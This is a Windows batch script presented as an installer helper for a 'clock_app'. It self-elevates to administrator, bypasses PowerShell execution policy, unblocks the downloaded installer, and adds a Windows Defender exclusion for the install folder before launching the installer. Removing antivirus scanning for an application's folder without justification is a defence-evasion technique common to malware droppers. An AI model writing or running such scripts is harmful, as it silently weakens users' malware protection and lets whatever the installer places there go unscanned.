@echo off
setlocal EnableExtensions

set "APP_DIR=%LOCALAPPDATA%\clock_app"
set "SCRIPT_DIR=%~dp0"
set "INSTALLER_PATH=%~1"

if not defined INSTALLER_PATH (
  for %%F in ("%SCRIPT_DIR%clock_app*setup*.exe") do (
    if /I not "%%~fF"=="%~f0" (
      set "INSTALLER_PATH=%%~fF"
      goto :found_installer
    )
  )
  for %%F in ("%SCRIPT_DIR%*setup*.exe") do (
    if /I not "%%~fF"=="%~f0" (
      set "INSTALLER_PATH=%%~fF"
      goto :found_installer
    )
  )
)

:found_installer
if not defined INSTALLER_PATH (
  echo Installer not found. Put this bat file and the NSIS installer in the same folder.
  echo You can also pass the installer path as the first argument.
  pause
  exit /b 1
)

echo Target install directory: "%APP_DIR%"
echo Installer: "%INSTALLER_PATH%"

rem Self-elevate for Defender exclusion registration
net session >nul 2>&1
if %errorlevel% neq 0 (
  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -ArgumentList '\"%INSTALLER_PATH%\"' -Verb RunAs"
  exit /b
)

echo [1/4] Unblocking installer...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%INSTALLER_PATH%'"

echo [2/4] Creating install directory (if needed)...
if not exist "%APP_DIR%" mkdir "%APP_DIR%"

echo [3/4] Adding Defender exclusion...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%APP_DIR%'"
if %errorlevel% neq 0 (
  echo Failed to add Defender exclusion. Check Windows Defender policy.
  pause
  exit /b 1
)

echo [4/4] Launching installer...
start "" "%INSTALLER_PATH%"

echo Done. Continue installation in the installer window.
pause
endlocal
